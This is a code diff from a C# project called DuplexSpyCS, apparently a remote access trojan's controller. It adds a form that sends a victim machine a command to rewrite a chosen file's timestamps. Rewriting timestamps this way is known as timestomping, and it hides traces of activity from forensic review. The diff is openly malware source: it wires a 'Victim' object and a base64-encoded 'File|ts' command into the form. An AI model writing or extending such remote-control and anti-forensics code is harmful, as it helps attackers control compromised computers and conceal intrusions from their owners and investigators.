@@ -12,8 +12,10 @@ namespace DuplexSpyCS
 {
     public partial class frmFileDatetime : Form
     {
+        private Victim v;
         private string m_szCurrentPath;
         private string m_szFilename;
+        private bool m_bIsFile;
 
         private enum FileTimestampType
         {
@@ -26,14 +28,18 @@ namespace DuplexSpyCS
         {
             InitializeComponent();
 
+            this.v = v;
             m_szCurrentPath = szCurrentPath;
             m_szFilename = szFilename;
+            m_bIsFile = bFile;
         }
 
         private void fnSetup()
         {
             textBox1.ReadOnly = true;
             textBox1.Text = m_szFilename;
+
+            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
 
             foreach (string szName in Enum.GetNames(typeof(FileTimestampType)))
                 comboBox1.Items.Add(szName);
@@ -51,9 +57,14 @@ namespace DuplexSpyCS
 
         private void button1_Click(object sender, EventArgs e)
         {
+            int nType = (int)(FileTimestampType)Enum.Parse(typeof(FileTimestampType), comboBox1.Text);
+            string szIsFile = m_bIsFile ? "1" : "0";
+            string szDatetme = dateTimePicker1.Value.ToString("F");
+            string szFilePath = Path.Combine(m_szCurrentPath, m_szFilename);
+
             Task.Run(() =>
             {
-
+                v.SendCommand($"File|ts|{szIsFile}|{Crypto.b64E2Str(szFilePath)}|{nType}|{Crypto.b64E2Str(szDatetme)}");
             });
         }
     }
